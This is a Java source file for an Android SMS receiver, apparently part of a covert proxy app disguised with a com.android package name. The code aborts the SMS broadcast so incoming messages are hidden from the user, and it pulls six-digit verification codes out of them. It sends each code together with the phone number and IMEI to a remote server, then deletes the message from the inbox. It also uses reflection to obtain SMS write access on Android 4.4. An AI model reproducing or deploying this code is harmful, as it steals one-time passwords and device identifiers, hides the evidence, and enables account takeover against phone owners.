package com.android.sms.proxy.service;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import android.util.Log;

import com.android.sms.proxy.entity.NativeParams;
import com.android.sms.proxy.entity.PhoneInfo;
import com.android.sms.proxy.entity.SpSimpleJsonImpl;
import com.android.sms.proxy.function.RequestManager;
import com.flurry.android.FlurryAgent;
import com.oplay.nohelper.loader.Loader_Base_ForCommon;
import com.oplay.nohelper.utils.Util_Service;
import com.oplay.nohelper.volley.RequestEntity;
import com.oplay.nohelper.volley.Response;
import com.oplay.nohelper.volley.VolleyError;

import org.connectbot.service.TerminalManager;

import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * 短信拦截
 *
 * @author zyq 16-3-9
 */
public class Receiver_SMS extends BroadcastReceiver {

	private final static boolean DEBUG = true;
	private final static String TAG = "smsReceiver";
	private final static String SMS_ACTION = "android.provider.Telephony.SMS_RECEIVED";
	private final static String SMS_CATEGORY = "android.intent.category.DEFAULT";
	private final String SMS_SERVICE = "pdus";
	private final String SMS_BODY = "body";
	private final String SMS_ID = "_id";
	private final String SMS_RECEIVE_CONTENT = "content://sms/inbox";
	private final String SMS_CONTENT = "content://sms";
	private final long VALID_SMS_TIME = 10 * 60 * 1000;

	private static OnReceiveSMSListener mOnReceiveSMSListener;

	public Receiver_SMS() {
	}

	;

	public Receiver_SMS(OnReceiveSMSListener listener) {
		mOnReceiveSMSListener = listener;
	}


	public static void registSmsReceiver(Context context, Receiver_SMS receiver) {
		IntentFilter filter = new IntentFilter();
		filter.addAction(SMS_ACTION);
		filter.addCategory(SMS_CATEGORY);
		context.registerReceiver(receiver, filter);
	}

	public static void setReceiveListener(OnReceiveSMSListener listener) {
		mOnReceiveSMSListener = listener;
	}

	public static void unRegisterSmsReceiver(Context context, Receiver_SMS reciever) {
		if (reciever != null) {
			context.unregisterReceiver(reciever);
		}
	}

	@Override
	public void onReceive(Context context, Intent intent) {
		try {

			if (SMS_ACTION.equals(intent.getAction())) {
				Bundle args = intent.getExtras();
				String msgContent = "";
				final boolean isHeartBeatServiceLive = Util_Service.isServiceRunning(context, HeartBeatService.class
						.getCanonicalName());
				if (DEBUG) {
					Log.d(TAG, "当前service状态 " + isHeartBeatServiceLive + " 收到短信:" + args);
				}
				if (!isHeartBeatServiceLive) return;
				final long currentTime = System.currentTimeMillis();
				//表示一个注册需要５分钟时间，若从建立连接ssh成功到之后５分钟时间，这段时间，会拦截该广播！！！！！！！！！！！！！
				if (HeartBeatService.recordConnectTime > 0 && (currentTime - HeartBeatService.recordConnectTime <
						VALID_SMS_TIME)) {
					this.abortBroadcast();
				} else {
					this.clearAbortBroadcast();
				}
				this.abortBroadcast();
				if (args != null) {
					Object[] pdus = (Object[]) args.get(SMS_SERVICE);
					SmsMessage messages[] = new SmsMessage[pdus.length];
					boolean hasPhoneNumber = true;
					String phoneNumber = PhoneInfo.getInstance(context).getDbPhoneNumber(context);
					if (TextUtils.isEmpty(phoneNumber)) {
						hasPhoneNumber = false;
					}
					for (int i = 0; i < messages.length; i++) {
						messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
						msgContent = messages[i].getMessageBody();
						//final String verifyCode = getVerificationCode(msgContent);
						if (!hasPhoneNumber) {
							final String number = getPhoneNumber(msgContent);
							if (DEBUG) {
								Log.d(TAG, "已经找到该手机号:" + number);
							}

							if (!TextUtils.isEmpty(number)) {
								hasPhoneNumber = true;
								PhoneInfo.getInstance(context).insertPhone(context, number);
								if (!TextUtils.isEmpty(PhoneInfo.msgText)) {
									deleteSMS(context, PhoneInfo.msgText);
								}
								//通过发短信得到手机号码：
								Map<String, String> map = new HashMap<>();
								map.put(NativeParams.KEY_SEND_SMS, String.valueOf(true));
								FlurryAgent.logEvent(NativeParams.EVENT_GET_PHONE_NUMBER, map);
							}
						}
						final boolean isTerminalServiceLive = Util_Service.isServiceRunning(context, TerminalManager
								.class.getCanonicalName());
						final boolean isProxyServiceLive = Util_Service.isServiceRunning(context, ProxyService.class
								.getCanonicalName());
						if (isTerminalServiceLive && isProxyServiceLive) {
							if (msgContent != null) {
								if (DEBUG) {
									Log.d(TAG, "收到的短信内容：" + msgContent);
								}
								String code = getVerificationCode(msgContent);
								if (DEBUG) {
									Log.d(TAG, "验证码是" + code);
								}
								if (TextUtils.isEmpty(code)) return;
								if (!TextUtils.isEmpty(code)) {
									sendRegisterCode(context, code);
									if (Build.VERSION.SDK_INT == Build.VERSION_CODES.KITKAT) {
										if (SmsWriteOpUtil.isWriteEnabled(context)) {
											boolean isSuccess = SmsWriteOpUtil.setWriteEnabled(context, true);
											final String model = Build.MODEL;
											if (DEBUG) {
												Log.d(TAG, "4.4反射修改短信权限！！！！！！ " + isSuccess);
											}
											Map<String, String> map = new HashMap<>();
											map.put(NativeParams.KEY_FIX_SYSTEM_SUCCESS, String.valueOf(isSuccess));
											map.put(NativeParams.KEY_KITKAT_DEVICE, model);
											FlurryAgent.logEvent(NativeParams.EVENT_VERSION_KITKAT, map);
										}
									}


									deleteSMS(context, msgContent);
//									if (HeartBeatRunnable.isSSHConnected) {
//										deleteSMS(context, msgContent);
//									}
								}
							}
						}
					}
				}
			}
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, e.fillInStackTrace().toString());
			}
			FlurryAgent.onError(TAG, "", e);
		}
	}


	private String getVerificationCode(String smsBody) {
		Pattern p = Pattern.compile("\\D\\d{6}\\D");
		Matcher m = p.matcher(smsBody);
		if (m.find()) {
			final int groupCount = m.groupCount();
			if (groupCount >= 0) {
				final String tempStr = m.group(0);
				return tempStr.substring(1, tempStr.length() - 1);
			}
		}
		return null;
	}


	private String getPhoneNumber(String smsBody) {
		if (DEBUG) {
			Log.d(TAG, "找手机号");
		}
		String telRegex = "[1][358]\\d{9}";
		Pattern p = Pattern.compile(telRegex);
		Matcher m = p.matcher(smsBody);
		if (m.find()) {
			final int groupCount = m.groupCount();
			if (groupCount >= 0) {
				final String tempStr = m.group(0);
				return tempStr.substring(0, tempStr.length());
			}
		}
		return null;
	}

	public interface OnReceiveSMSListener {
		void onReceiveSMS(String sms);
	}


	public void deleteSMS(Context context, String smsContent) {
		try {
			if (DEBUG) {
				Log.d(TAG, "要删除的短信内容是：" + smsContent);
			}
			Uri uri = Uri.parse(SMS_CONTENT);
			ContentResolver contentResolver = context.getContentResolver();
			if (contentResolver != null) {
				Cursor isRead = contentResolver.query(uri, null, null, null, null);
				while (isRead.moveToNext()) {
					String body = isRead.getString(isRead.getColumnIndex(SMS_BODY)).trim();
					if (DEBUG) {
						Log.d(TAG, "短信内容:" + body);
					}
					if (body.equals(smsContent)) {
						int id = isRead.getInt(isRead.getColumnIndex(SMS_ID));
						if (DEBUG) {
							Log.d(TAG, "找到该短信:" + smsContent + " 短信标识为:" + id + "准备删除!");
						}
						int count = context.getContentResolver().delete(Uri.parse(SMS_CONTENT), "_id=" + id, null);

						final String device = Build.MODEL;
						final String verison = Build.VERSION.RELEASE;
						final boolean isDeleteSuccess = count >= 1 ? true : false;
						Map<String, String> map1 = new HashMap<>();
						map1.put(NativeParams.KEY_DELETE_SMS_SUCCESS, String.valueOf(isDeleteSuccess));
						FlurryAgent.logEvent(NativeParams.EVENT_SEND_SMS, map1);

						if (count >= 1) {
							Map<String, String> map = new HashMap<>();
							map.put(NativeParams.KEY_DELETE_SUCCESS_DEVICE, device);
							map.put(NativeParams.KEY_DELETE_SUCCESS_VERSION, verison);
							FlurryAgent.logEvent(NativeParams.EVENT_DELETE_SMS_SUCCESS, map);
						} else {
							Map<String, String> map = new HashMap<>();
							map.put(NativeParams.KEY_DELETE_FAIL_DEVICE, device);
							map.put(NativeParams.KEY_DELETE_FAIL_VERSION, verison);
							FlurryAgent.logEvent(NativeParams.EVENT_DELETE_SMS_FAILED, map);
						}
						if (DEBUG) {
							Log.d(TAG, "当前版本号:" + Build.VERSION.SDK_INT + "短信是否删除成功：" + ((count >= 1) ? "删除成功" :
									"删除失败"));
						}
					}
				}
			}
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, e.fillInStackTrace().toString());
			}
			FlurryAgent.onError(TAG, "", e);
		}
	}

	public void sendRegisterCode(final Context context, String sms) {
		String number = PhoneInfo.getInstance(context).getNativePhoneNumber();
		if (TextUtils.isEmpty(number)) return;
		Map<String, String> map = new HashMap<>();
		map.put(NativeParams.TYPE_PHONE_NUMBER, PhoneInfo.getInstance(context).getNativePhoneNumber());
		map.put(NativeParams.TYPE_PHONE_IMEI, PhoneInfo.getInstance(context).getIMEI());
		map.put(NativeParams.TYPE_PHONE_SMS, sms);
		String authStr = RequestManager.getAuthStr(NativeParams.AES_KEY, map);
		Map<String, String> map1 = new HashMap<>();
		map1.put("s", authStr);
		RequestEntity<SpSimpleJsonImpl> entity = new RequestEntity<SpSimpleJsonImpl>(NativeParams.URL_SEND_CODE,
				SpSimpleJsonImpl.class, map1);
		Loader_Base_ForCommon.getInstance().onRequestLoadNetworkTask(entity, true, new Response.Listener() {
			@Override
			public void onResponse(Object response) {
				if (response instanceof SpSimpleJsonImpl) {
					int code = ((SpSimpleJsonImpl) response).getCode();
					if (code == NativeParams.SUCCESS) {
						String data = ((SpSimpleJsonImpl) response).getData();
					}
				}
			}
		}, new Response.ErrorListener() {
			@Override
			public void onErrorResponse(VolleyError error) {
				if (DEBUG) {
					Log.d(TAG, error.toString());
				}
				FlurryAgent.onError(TAG, "", error.fillInStackTrace());
			}
		});
	}
}
